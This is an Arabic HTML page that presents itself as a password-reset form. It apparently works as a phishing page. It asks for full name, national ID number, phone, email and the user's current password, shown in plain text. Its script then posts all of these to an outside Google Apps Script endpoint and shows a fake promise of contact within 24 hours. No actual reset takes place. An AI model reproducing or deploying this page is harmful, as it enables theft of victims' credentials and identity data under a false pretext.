<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>نسيت كلمة المرور</title>
<style>
:root {--main-color:#005d7e;--button-dark:#484646;--bg-color:#f0f4f8;--font-color:#222;}
body {font-family:"Tajawal",sans-serif;background:var(--bg-color);margin:0;padding:0;}
.container {max-width:450px;margin:60px auto;background:#fff;padding:25px;border-radius:18px;box-shadow:0 0 15px rgba(0,0,0,0.08);border-top:8px solid var(--main-color);}
h2 {text-align:center;color:var(--main-color);margin-bottom:25px;font-size:26px;}
label {font-weight:bold;margin-bottom:6px;display:block;color:var(--font-color);}
input {width:100%;padding:12px;border-radius:8px;border:1px solid #ccc;margin-bottom:18px;font-size:15px;}
button {width:100%;background:var(--main-color);padding:14px;font-size:17px;border:none;border-radius:8px;color:white;cursor:pointer;transition:0.2s;}
button:hover {background:var(--button-dark);}
.success {display:none;padding:14px;background:#d4edda;color:#245c2a;border-radius:8px;text-align:center;margin-top:15px;font-size:16px;}
</style>
</head>
<body>
<div class="container">
<h2>اعادة تعيين كلمة المرور</h2>
<form id="forgotForm">
<label>الاسم الثلاثي</label>
<input type="text" id="fullname" required>
<label>رقم الهوية</label>
<input type="text" id="idnumber" required>
<label>رقم الهاتف</label>
<input type="text" id="phone" required>
<label>البريد الإلكتروني</label>
<input type="email" id="email" required>
<label>كلمة المرور التي تتذكرها</label>
<input type="text" id="oldpass" required>
<button type="submit">إرسال الطلب</button>
</form>
<div class="success" id="successMsg">
تم إرسال طلبك بنجاح، سيتم التواصل معك على الهاتف او الايميل خلال 24 ساعة.
</div>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxZc6j4CDbuHd6eXpHw7Zh3iza-myYxi8S9jR-AcZZKbiTIbwR8EunKgHjU9vhEktGq1A/exec";

document.getElementById("forgotForm").addEventListener("submit", async (e)=>{
    e.preventDefault();
    const data = new URLSearchParams();
    data.append("fullname", document.getElementById("fullname").value);
    data.append("id", document.getElementById("idnumber").value);
    data.append("phone", document.getElementById("phone").value);
    data.append("email", document.getElementById("email").value);
    data.append("oldpass", document.getElementById("oldpass").value);
    data.append("timestamp", new Date().toLocaleString("ar-SA"));

    try{
        const res = await fetch(SCRIPT_URL,{method:"POST",body:data});
        if(res.ok){
            document.getElementById("successMsg").style.display="block";
            document.getElementById("forgotForm").reset();

        } else {
            
        }
    }catch(err){
     
    }
});
</script>
</body>
</html>
